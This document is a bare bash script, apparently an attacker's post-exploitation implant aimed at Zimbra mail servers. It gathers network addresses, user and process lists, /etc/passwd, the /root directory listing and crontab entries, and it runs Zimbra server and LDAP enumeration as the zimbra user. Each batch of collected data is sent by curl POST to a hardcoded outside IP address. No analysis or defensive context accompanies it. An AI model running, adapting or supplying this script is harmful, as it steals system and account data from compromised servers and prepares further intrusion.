#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# zmcens: zimbra census -> mel2_cens
O=/tmp/.CENS.txt
: > "$O"
ZM=/opt/zimbra/bin
if [ "$(whoami)" = "zimbra" ]; then
  $ZM/zmprov gas >>"$O" 2>&1
  $ZM/zmlocalconfig ldap_url ldap_master_url >>"$O" 2>&1
else
  su zimbra -s /bin/bash -c "$ZM/zmprov gas" >>"$O" 2>&1
  su zimbra -s /bin/bash -c "$ZM/zmlocalconfig ldap_url ldap_master_url" >>"$O" 2>&1
fi
echo "== host: $(hostname) date: $(date -u) ==" >>"$O"
curl -sm60 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_cens"
echo CENS_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


